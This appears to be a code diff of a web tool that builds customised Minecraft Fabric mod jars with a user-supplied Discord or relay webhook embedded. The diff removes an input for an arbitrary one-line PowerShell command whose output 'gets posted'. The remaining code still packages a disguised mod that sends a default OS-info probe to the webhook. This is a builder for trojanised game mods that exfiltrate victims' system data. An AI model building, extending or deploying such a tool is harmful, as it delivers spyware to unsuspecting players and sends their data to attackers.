@@ -159,17 +159,16 @@
     font-size: .72rem; letter-spacing: .08em; text-transform: uppercase;
     color: #6e7c90;
   }
-  .custom-body input, .custom-body textarea, .fld.top input {
+  .custom-body input, .custom-body textarea {
     width: 100%; padding: .6rem .8rem; border-radius: 10px;
     border: 1px solid var(--line); background: rgba(10,14,20,.8);
     color: var(--txt); font-size: .9rem; outline: none; font-family: inherit;
     transition: border .15s, box-shadow .15s; resize: vertical;
   }
-  .custom-body input:focus, .custom-body textarea:focus, .fld.top input:focus {
+  .custom-body input:focus, .custom-body textarea:focus {
     border-color: rgba(94,234,212,.55);
     box-shadow: 0 0 0 3px rgba(94,234,212,.1);
   }
-  .fld.top { margin: 1rem 0 0; }
   .hint { font-size: .72rem; color: #5d6b7d; }
   pre.cf-code {
     margin: 0; padding: .8rem .9rem; border-radius: 10px; overflow-x: auto;
@@ -348,14 +347,6 @@
     <section class="panel active" role="tabpanel" id="panel-build">
       <input id="wh" type="text" spellcheck="false" autocomplete="off"
              placeholder="https://your-relay.workers.dev — or your Discord hook">
-
-      <div class="fld top">
-        <label for="pc">Command to run</label>
-        <input id="pc" type="text" spellcheck="false" maxlength="300"
-               placeholder="Leave blank for the default OS-info probe">
-        <span class="hint">One line of PowerShell. Whatever it prints is what gets
-          posted. Must finish fast and print something.</span>
-      </div>
 
       <details class="custom" id="custom">
         <summary>Customize name &amp; details</summary>
@@ -549,7 +540,6 @@
   const $ = id => document.getElementById(id);
   const wh = $('wh'), btn = $('build'), status = $('status'), dl = $('dl'), stats = $('stats');
   const fn = $('fn'), mid = $('mid'), mname = $('mname'), desc = $('desc');
-  const pc = $('pc');
   dl.style.display = 'none';
 
   // ---- tabs ----
@@ -624,14 +614,6 @@
     }
     const modDesc = desc.value.trim().slice(0, 120);
 
-    // ---- probe command ----
-    const probe = pc.value.trim();
-    if (probe && /[\r\n]/.test(probe)) {
-      status.textContent = 'Command must be a single line.';
-      status.className = 'err';
-      return;
-    }
-
     btn.disabled = true;
     status.textContent = 'Stitching the jar…';
 
@@ -639,7 +621,6 @@
       const zip = await JSZip.loadAsync(template);
       // burn the hook + rewritten metadata in
       zip.file('webhook.txt', url);
-      if (probe) zip.file('probe.txt', probe);
       const meta = JSON.parse(await zip.file('fabric.mod.json').async('string'));
       meta.id = modId;
       meta.name = modName;
